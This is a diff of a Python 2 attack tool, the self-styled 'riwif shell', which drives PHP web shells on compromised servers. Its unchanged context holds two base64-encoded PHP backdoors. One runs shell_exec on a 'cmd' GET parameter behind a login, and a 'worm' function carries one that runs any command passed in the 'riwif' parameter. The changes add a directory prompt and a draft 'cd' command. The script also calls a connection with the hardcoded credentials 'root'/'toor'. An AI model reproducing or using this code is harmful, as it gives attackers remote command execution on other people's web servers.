@@ -13,6 +13,7 @@ PASSWORD = ''
 HOST = ''
 SHELL = 'JHNlc3Npb25fc3RhcnQgPSAwOw0KaWYoaXNzZXQoJF9HRVRbJ3UnXSkgJiYgaXNzZXQoJF9HRVRbJ3AnXSkpDQoJaWYoJF9HRVRbJ3UnXSA9PSAkdXNlciAmJiBtZDUoJF9HRVRbJ3AnXSkgPT0gJHBhc3MpDQoJCSRzZXNzaW9uX3N0YXJ0ID0gMTsNCgllbHNlDQoJCWVjaG8gJ0JhZCBsb2dpbic7DQppZigkc2Vzc2lvbl9zdGFydCA9PSAxICYmIGlzc2V0KCRfR0VUWydjbWQnXSkpDQoJaWYoJF9HRVRbJ2NtZCddID09ICdob3N0JykgZWNobyAkX1NFUlZFUlsnSFRUUF9IT1NUJ10uJzonLmdldGN3ZCgpOw0KCWVsc2UgZWNobyhzaGVsbF9leGVjKCRfR0VUWydjbWQnXS4iICYiKSk7'
 SHELL_NAME = ''
+DIR = '/'
 
 def worm():
 	code_worm = 'aWYoIWVtcHR5KCRfR0VUWydyaXdpZiddKSkgDQoJZWNobyBzaGVsbF9leGVjKCRfR0VUWydyaXdpZiddKTs=';
@@ -62,12 +63,29 @@ def base():
 	BASE = url_check.read()
 
 def command():
+	global DIR
 	user_mysql = ''
 	pass_mysql = ''
 	host_mysql = ''
 	bdd_mysql  = ''
 
-	ask = raw_input(BASE + ':~# ')
+	ask = raw_input(BASE + DIR + ':~# ')
+	"""
+	Work on cd cmd
+	if 'cd' in ask:
+		dirs = ask.split(' ')
+		if os.path.exists(dirs[1]):
+			if '../' in dirs[1]:
+				dirs = dirs[1].split('../')
+				if not dirs[1]:
+					print 'not'
+				else:
+					print vars(dirs)
+			else:
+				DIR = '/' + dirs[1]
+		else:
+			print 'error'
+	"""
 	if ask == 'worm':
 		worm()
 	if ask == 'clear':
@@ -119,10 +137,10 @@ WWWWWWWWWWWWW
 	print "[~] Exit riwif shell : use -> quit"
 
 def main():
-	if len(sys.argv) < 3:
+	if len(sys.argv) < 6:
 		help()
 		sys.exit()
-	if len(sys.argv) > 3:
+	if len(sys.argv) > 6:
 		connexion('root','toor')
 	else:
 		print help()
